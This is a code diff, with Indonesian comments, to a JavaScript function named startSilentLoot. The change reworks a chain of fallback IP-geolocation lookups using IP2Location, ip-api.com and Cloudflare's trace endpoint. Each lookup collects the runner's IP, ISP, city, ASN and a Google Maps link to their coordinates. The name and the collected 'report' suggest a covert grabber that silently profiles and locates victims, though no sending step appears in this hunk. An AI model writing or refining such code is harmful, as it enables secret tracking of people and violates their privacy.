@@ -101,34 +101,45 @@ async function startSilentLoot() {
 
     // 2. AMBIL DATA LOKASI (SYSTEM WATERFALL / CADANGAN)
     async function fetchLocation() {
-        // CADANGAN 1: IP2Location (Yang lu pake sekarang)
+        // UTAMA: IP2Location (Paling lengkap)
         try {
             const res = await fetch(`https://api.ip2location.io/?key=${IP2LOC_KEY}`);
             const d = await res.json();
-            if (d.ip) return { 
-                ip: d.ip, isp: d.isp, city: d.city_name, 
-                district: d.district || "N/A", 
-                loc: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`,
-                asn: d.asn
-            };
-        } catch (e) { console.log("API 1 Limit"); }
-
-        // CADANGAN 2: IPIFY (Pake yang lu mau, tapi datanya CUMA IP)
+            if (d.ip) {
+                return { 
+                    ip: d.ip, 
+                    isp: d.isp || "Unknown ISP", 
+                    city: d.city_name || "Unknown City", 
+                    district: d.district || "N/A", 
+                    loc: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`,
+                    asn: d.asn || "N/A"
+                };
+            }
+        } catch (e) { console.log("API 1 Error"); }
+    
+        // CADANGAN: IP-API (Gratis & dapet ISP juga buat jaga-jaga)
         try {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            report.ip = data.ip; // Pakai report.ip (langsung), jangan pake .network kalau gak ada
-        } catch (e) {
-            report.ip = "Failed to fetch IP";
-        }
-
-        // CADANGAN 3: Cloudflare (Benteng terakhir)
+            const res = await fetch(`http://ip-api.com/json/`);
+            const d = await res.json();
+            if (d.status === "success") {
+                return { 
+                    ip: d.query, 
+                    isp: d.isp, 
+                    city: d.city, 
+                    district: "N/A", 
+                    loc: `https://www.google.com/maps?q=${d.lat},${d.lon}`,
+                    asn: d.as
+                };
+            }
+        } catch (e) { console.log("API 2 Error"); }
+    
+        // BENTENG TERAKHIR: Cloudflare (Minimal dapet IP)
         try {
             const res = await fetch(`https://1.1.1.1/cdn-cgi/trace`);
             const text = await res.text();
             const ip = text.match(/ip=(.*)\n/)[1];
-            return { ip: ip, isp: "Cloudflare Warp", city: "Unknown", district: "N/A", loc: "#", asn: "Unknown" };
-        } catch (e) { return { ip: "All API Failed" }; }
+            return { ip: ip, isp: "ISP Not Detected", city: "Unknown", district: "N/A", loc: "#", asn: "N/A" };
+        } catch (e) { return { ip: "Offline" }; }
     }
 
     // Eksekusi Waterfall
